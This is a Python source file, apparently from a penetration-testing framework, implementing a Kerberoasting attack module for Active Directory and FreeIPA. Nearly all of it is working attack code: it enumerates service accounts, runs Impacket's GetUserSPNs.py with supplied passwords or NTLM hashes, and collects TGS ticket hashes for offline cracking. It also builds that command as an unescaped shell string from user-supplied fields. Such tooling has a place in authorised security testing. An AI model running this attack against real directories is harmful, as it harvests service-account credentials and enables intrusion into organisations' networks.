"""
Kerberoasting Attack Module

Executes Kerberoasting attack for obtaining TGS tickets of service accounts
"""

import time
from typing import Dict, Any
from ....proto import DirectoryType, ScanOptions
from ...enumeration.user_enumerator import UserEnumerator
from utils.async_subprocess import run_exec, run_shell


class KerberoastAttack:
    """Executes Kerberoasting attack"""
    
    def __init__(self, plugin_instance):
        self.plugin = plugin_instance
        self.user_enumerator = UserEnumerator(plugin_instance)
    
    async def execute(self, scan_options: ScanOptions, directory_type: DirectoryType) -> Dict[str, Any]:
        """
        Executes Kerberoasting attack for obtaining TGS tickets of service accounts.
        
        Args:
            scan_options: Parameters for execution attack
            directory_type: Directory type
            
        Returns:
            Dict[str, Any]: Attack results, including TGS hashes
        """
        result = {
            "success": False,
            "tickets": [],
            "errors": [],
            "statistics": {
                "total_spns_found": 0,
                "total_tickets_obtained": 0,
                "execution_time": 0
            }
        }
        
        start_time = time.time()
        
        if not scan_options.domain_name:
            result["errors"].append("Domain name not specified")
            return result
        
        if not (scan_options.username and (scan_options.password or scan_options.ntlm_hash)):
            result["errors"].append("Credentials not specified")
            return result
        
        try:
            if directory_type == DirectoryType.ACTIVE_DIRECTORY:
                kerberoast_candidates = []
                
                users = await self.user_enumerator.enumerate(scan_options, directory_type)
                
                for user in users:
                    if user.kerberoast_candidate and user.service_principal_names:
                        kerberoast_candidates.append(user)
                
                result["statistics"]["total_spns_found"] = sum(len(user.service_principal_names) for user in kerberoast_candidates)
                
                if not kerberoast_candidates:
                    result["success"] = True
                    result["errors"].append("no suitable accounts found for Kerberoasting")
                    return result
                
                try:
                    cmd_parts = []
                    cmd_parts.append("GetUserSPNs.py")
                    
                    if scan_options.ntlm_hash:
                        cmd_parts.append(f"{scan_options.domain_name}/{scan_options.username} -hashes :{scan_options.ntlm_hash}")
                    else:
                        cmd_parts.append(f"{scan_options.domain_name}/{scan_options.username}:{scan_options.password}")
                    
                    if scan_options.ldap_server:
                        cmd_parts.append(f"-dc-ip {scan_options.ldap_server}")
                    
                    cmd_parts.append("-request")
                    
                    cmd = " ".join(cmd_parts)
                    
                    rc, out, err = await run_shell(cmd, timeout=120, allow_unsafe_shell=True)
                    
                    if rc == 0:
                        ticket_hashes = []
                        for line in (out or "").strip().split("\n"):
                            if "$krb5tgs$" in line:
                                parts = line.split(":")
                                if len(parts) >= 2:
                                    username = parts[0].strip()
                                    hash_value = parts[1].strip()
                                    
                                    ticket_hashes.append({
                                        "username": username,
                                        "hash": hash_value,
                                        "hash_type": "Kerberos 5 TGS-REP etype 23"
                                    })
                        
                        result["tickets"] = ticket_hashes
                        result["statistics"]["total_tickets_obtained"] = len(ticket_hashes)
                        result["success"] = True
                    else:
                        result["errors"].append(f"Error during execution Kerberoasting: {err}")
                except Exception as e:
                    result["errors"].append(f"Error during execution Kerberoasting: {str(e)}")
            
            elif directory_type == DirectoryType.FREEIPA:
                try:
                    if scan_options.password:
                        await run_exec(["kinit", scan_options.username], stdin=f"{scan_options.password}\n", timeout=10)
                    
                    rc, out, err = await run_exec(["ipa", "service-find", "--all"], timeout=30)
                    
                    if rc == 0:
                        service_entries = (out or "").split('Principal name: ')
                        
                        service_principals = []
                        for entry in service_entries[1:]:
                            lines = entry.splitlines()
                            if not lines:
                                continue
                            
                            principal = lines[0].strip()
                            service_principals.append(principal)
                        
                        result["statistics"]["total_spns_found"] = len(service_principals)
                        
                        ticket_hashes = []
                        for spn in service_principals:
                            try:
                                await run_exec(["kvno", spn], timeout=10)
                                
                                krc, kout, _ = await run_exec(["klist", "-e"], timeout=10)
                                
                                if krc == 0:
                                    for line in (kout or "").strip().split("\n"):
                                        if spn in line:
                                            ticket_hashes.append({
                                                "principal": spn,
                                                "note": "Ticket obtained and is located in Kerberos cache. For extraction and cracking additional tools are required."
                                            })
                                            break
                            except Exception:
                                pass
                        
                        result["tickets"] = ticket_hashes
                        result["statistics"]["total_tickets_obtained"] = len(ticket_hashes)
                        result["success"] = True
                    else:
                        result["errors"].append(f"Error during search for service principals: {err}")
                except Exception as e:
                    result["errors"].append(f"Error during execution Kerberoasting in FreeIPA: {str(e)}")
            
            else:
                result["errors"].append("Unsupported directory type")
        
        except Exception as e:
            result["errors"].append(f"General error: {str(e)}")
        
        result["statistics"]["execution_time"] = time.time() - start_time
        
        return result

